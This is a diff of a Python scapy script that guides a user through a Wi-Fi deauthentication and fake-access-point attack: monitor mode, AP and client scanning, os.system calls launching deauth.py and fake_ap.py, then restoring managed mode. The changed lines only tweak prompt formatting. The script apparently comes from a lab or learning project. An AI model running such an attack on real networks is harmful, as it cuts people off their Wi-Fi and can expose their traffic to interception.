@@ -2,7 +2,7 @@ import os
 import sys
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt 
-# import pandas
+
 
 
 
@@ -39,7 +39,7 @@ T  = '\033[93m' # tan
 def monitor_mode():
     global interface
     print(G + "*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
-    empty = input ("Press Enter to continue.........\n")
+    empty = input ("Press Enter to continue.........")
     print(W)
     os.system('ifconfig')
     interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
@@ -53,7 +53,7 @@ def monitor_mode():
 ### After we finish our attack, we want to switch back the interface to 'managed mode'. 
 def managed_mode():
     print(G + "\n*** Step 5: Put the interface back in managed mode. *** \n")
-    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........\n")
+    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........")
     print(W)
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode managed')
@@ -71,7 +71,7 @@ def managed_mode():
 ### Rapper function for 'wifi_scan()'. 
 def ap_scan_rap():
     print(G + "*** Step 2: Scanning the network for AP to attack. *** \n")
-    empty = input ("Press Enter to continue.........\n")
+    empty = input ("Press Enter to continue.........")
     # os.system ('airodump-ng ' + interface)
     ap_scan()
 
@@ -105,7 +105,7 @@ def ap_scan():
         # client_scan_rap()
     else: 
         # If no AP was found. 
-        rescan = input("No networks were found. Do you want to rescan? [Y/n] \n")
+        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
         if rescan == "n":
             print("  Sorry :(  ")
         else:
@@ -155,7 +155,7 @@ def ap_scan_pkt(pkt):
 ### Rapper function for 'client_scan()'. 
 def client_scan_rap():
     print(G + "\n*** Step 3: Verifying that at least 1 client is connected to the AP you choose. *** \n")
-    empty = input ("Press Enter to continue.........\n")
+    empty = input ("Press Enter to continue.........")
     print(W)
     # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
     client_scan()
@@ -190,7 +190,7 @@ def client_scan():
             # deauth_attack()
     else: 
         # If no client was found. 
-        rescan = input("No clients were found. Do you want to rescan? [Y/n] \n")
+        rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
         if rescan == "n":
             print("  Sorry :(  ")
         else:
@@ -220,13 +220,13 @@ def client_scan_pkt(pkt):
 def deauth_attack():
     print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
     print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
-    empty = input ("Press Enter to start sending the Deauthentication packets.........\n")
+    empty = input ("Press Enter to start sending the Deauthentication packets.........")
     print(W)
     os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
     os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)
 
 
-
+######################
 
 if __name__ == "__main__":
     
